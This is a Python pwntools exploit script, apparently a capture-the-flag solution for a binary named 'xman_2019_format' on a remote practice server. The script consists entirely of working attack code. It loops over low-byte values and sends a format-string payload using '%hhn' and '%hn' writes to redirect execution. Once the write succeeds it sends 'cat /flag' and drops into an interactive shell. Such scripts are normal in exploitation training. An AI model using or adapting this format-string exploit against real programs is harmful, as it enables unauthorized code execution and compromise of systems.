# coding:utf-8
from pwn import *
context.log_level = 'debug'



def pwn():
    proc_name = 'xman_2019_format'
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    elf = ELF(proc_name)
    for i in range(4, 0x100, 4):
        payload = "%"+ str(i) + "c%10$hhn|%34219c%18$hn"

        try:
            islocal = 0
            if islocal:
                p = process(proc_name)
            else:
                p = remote('node4.buuoj.cn', 27468)

            log.info("low byte => " + hex(i))
            p.recv()
            p.sendline(payload)
            p.recv(timeout=1)
            sleep(1)
            p.sendline('cat /flag')
            p.recvline_contains("flag", timeout=1)
            p.interactive()
        except:
            p.close()

if __name__ == '__main__':
    pwn()
